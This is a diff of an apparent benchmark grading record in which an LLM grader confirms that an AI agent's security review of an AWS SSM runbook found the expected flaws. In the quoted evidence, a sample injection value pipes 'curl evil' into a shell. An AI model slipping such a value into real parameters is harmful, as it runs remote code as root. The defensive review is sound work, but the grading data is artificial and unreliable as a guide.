@@ -14,7 +14,7 @@
     },
     "expected_output": {
       "result": "passed",
-      "reasoning": "The agent's response covers every required finding: (1) command injection via LogPath with weak '.*' pattern flagged as Critical and fixed with an anchored pattern; (2) DbPassword declared as SecureString flagged as invalid parameter type and echoed secret flagged as Critical, with no actual secret value repeated, and replaced with a Parameter Store name parameter read at run time; (3) missing allowedPattern on InstanceId, fixed with an instance ID regex; (4) curl -k disabling TLS verification flagged and fixed by removing -k; (5) hard-coded assumeRole ARN flagged and replaced with {{AutomationAssumeRole}} parameter; (6) timeoutSeconds 1200 flagged as exceeding the 600s max for aws:executeScript and lowered to 600; (7) onCancel: step:Wait flagged as invalid (Wait is aws:sleep, not a valid cancel target) and fixed to Abort; (8) onFailure: Continue on RotateLogs explicitly called out as an informational item (not a finding needing a fix). The hardened YAML document is provided with all these changes applied: anchored LogPath pattern, instance ID pattern, DbPasswordParameterName as Parameter Store name, -k removed, assumeRole parameterized, timeout at 600, onCancel set to Abort. Each change is cited with sources. This closely matches the expected output in substance.",
+      "reasoning": "The agent's response addresses every required finding in the expected output: (1) command injection via LogPath with weak '.*' pattern, flagged as Critical with quoting fix and anchored pattern; (2) DbPassword as SecureString (invalid doc parameter type) and echoed in a command, flagged Critical, replaced with a Parameter Store name parameter read at run time, without repeating any secret value; (3) missing allowedPattern on InstanceId - added; (4) curl -k disabling TLS - flagged High and fixed by removing -k; (5) hard-coded assumeRole ARN - flagged High and parameterized to {{AutomationAssumeRole}}; (6) timeoutSeconds 1200 exceeding the 600s max for aws:executeScript - flagged and lowered to 600; (7) onCancel pointing to aws:sleep step (invalid target) - flagged Medium and fixed to Abort; (8) onFailure: Continue on RotateLogs - explicitly called out as informational/flagged for user confirmation, not changed, consistent with 'lists ... as information'. The hardened YAML document includes all the described fixes: anchored LogPath pattern, instance ID pattern, Parameter Store name parameter, -k removed, assumeRole parameterized, timeout 600, onCancel fixed. Each change is cited with sources. This closely matches the expected output description.",
       "confidence": "high"
     },
     "assertions": {
@@ -23,72 +23,72 @@
           "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"LogPath is used in tar and in rm -rf {{LogPath}}/*, and its pattern is .*. A value like /tmp/x; curl evil|sh runs arbitrary commands as root on the instance.\"",
-          "reasoning": "The agent explicitly flags LogPath's '.*' pattern and interpolation into tar/rm commands as a command injection risk, labeled Critical.",
+          "evidence": "PROPOSED FIX 1: 'LogPath accepted any string (.*) and went straight into tar ... && rm -rf {{LogPath}}/*. A value like /; curl evil|sh runs arbitrary commands.'",
+          "reasoning": "The agent explicitly flags LogPath's weak pattern '.*' as a command-injection/shell risk, citing an injection example.",
           "confidence": "high"
         },
         {
           "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"SecureString isn't a valid document parameter type... I replaced it with a String that holds a Parameter Store name\" and parameter renamed to DbPasswordParameterName.",
-          "reasoning": "The agent flags SecureString as invalid for document parameters and replaces DbPassword with a parameter holding the Parameter Store parameter name.",
+          "evidence": "'DbPassword (check 10): type: SecureString is not a valid document parameter type, so it is now String... renamed (see proposed fix 2).' and PROPOSED FIX 2 introduces 'DbPasswordParameterName' to be used with 'aws ssm get-parameter --with-decryption'.",
+          "reasoning": "Agent flags SecureString as invalid and recommends using a Parameter Store parameter name instead, matching the assertion exactly.",
           "confidence": "high"
         },
         {
           "text": "Flags the echo of DbPassword as exposing a secret",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"{{DbPassword}} is echoed in a command. The value ends up in the command text, the command output, and any CloudWatch or S3 output logging.\"",
-          "reasoning": "The agent explicitly flags the echo of DbPassword as a secret exposure issue (Critical).",
+          "evidence": "PROPOSED FIX 2 Issue: 'echo \"restarting with password {{DbPassword}}\" writes the secret into the command text and the command output... lands in execution history and in the parameter value of every execution.'",
+          "reasoning": "Clearly flags the echo of DbPassword as exposing a secret.",
           "confidence": "high"
         },
         {
           "text": "Flags curl -k as disabling TLS verification",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"curl -k skips certificate validation, so the notify call can be intercepted or spoofed.\"",
-          "reasoning": "The agent flags curl -k as disabling TLS verification.",
+          "evidence": "PROPOSED FIX 4: 'curl -k disables certificate checks, so the notify call can be intercepted or spoofed.'",
+          "reasoning": "Directly flags curl -k as disabling TLS verification.",
           "confidence": "high"
         },
         {
           "text": "Flags the hard-coded assumeRole ARN",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"assumeRole is pinned to a role ARN in account 012345678901_2. Other teams can't use the runbook in their own accounts...\"",
-          "reasoning": "The agent flags the hard-coded assumeRole ARN and proposes replacing it with a parameterized role.",
+          "evidence": "PROPOSED FIX 3: 'assumeRole is hard-coded to one account's role. The runbook can't be used by other teams or accounts...' with AFTER: assumeRole: '{{AutomationAssumeRole}}'",
+          "reasoning": "Clearly flags the hard-coded assumeRole ARN as an issue and proposes parameterizing it.",
           "confidence": "high"
         },
         {
           "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"I lowered it from 1200 to 600, the documented maximum for aws:executeScript.\"",
-          "reasoning": "The agent flags timeoutSeconds 1200 as exceeding the documented maximum of 600 for aws:executeScript and lowers it.",
+          "evidence": "'CheckHealth.timeoutSeconds (check 5): lowered from 1200 to 600, the documented maximum for aws:executeScript.'",
+          "reasoning": "Explicitly flags 1200 as above the max of 600 and fixes it.",
           "confidence": "high"
         },
         {
           "text": "Flags onCancel routing to an aws:sleep step as invalid",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"CheckHealth has onCancel: step:Wait, and Wait is an aws:sleep step. aws:sleep can't be an onCancel target.\"",
-          "reasoning": "The agent flags onCancel: step:Wait as invalid since Wait is an aws:sleep step.",
+          "evidence": "PROPOSED FIX 5: 'onCancel: step:Wait points at an aws:sleep step, and aws:sleep can't be an onCancel target.' AFTER: onCancel: Abort",
+          "reasoning": "Clearly flags the onCancel routing to aws:sleep as invalid.",
           "confidence": "high"
         },
         {
           "text": "Returns a complete hardened document in YAML",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "The 'Hardened document' section contains a full YAML block starting with 'schemaVersion: 0.3' through the Wait step.",
-          "reasoning": "The output contains a complete hardened YAML document with schemaVersion, parameters, and all three mainSteps.",
+          "evidence": "The 'Hardened document' section contains a full YAML document with schemaVersion, description, assumeRole, parameters, and all three mainSteps.",
+          "reasoning": "A complete, valid-looking YAML document is provided at the end of the output.",
           "confidence": "high"
         },
         {
           "text": "Cites a documentation page for findings",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "\"SOURCE: Schemas (\\\"Parameter security best practices\\\"), Parameters\" and \"SOURCE: Data protection, Security best practices, Parameter Store in Run Command\"",
-          "reasoning": "The agent cites documentation-like sources for each finding, e.g. 'Source: Schemas (\"Parameter security best practices\"), Parameters' and others.",
+          "evidence": "Multiple 'SOURCE:' citations such as 'Source: Schemas, \"Parameter security best practices\".', 'Source: Running an automation.', 'Source: Data protection.', 'Source: Actions reference, \"Properties shared by all actions\".'",
+          "reasoning": "Each finding includes a cited source/documentation reference, satisfying the assertion though these are generic doc section names rather than URLs; still counts as citing a documentation page/section.",
           "confidence": "medium"
         },
         {
@@ -121,8 +121,8 @@
     }
   },
   "metrics": {
-    "runtime": "56s",
-    "cost": "$0.47",
+    "runtime": "1m5s",
+    "cost": "$0.55",
     "context_window": {
       "utilization": "5.7%",
       "compaction_count": 0
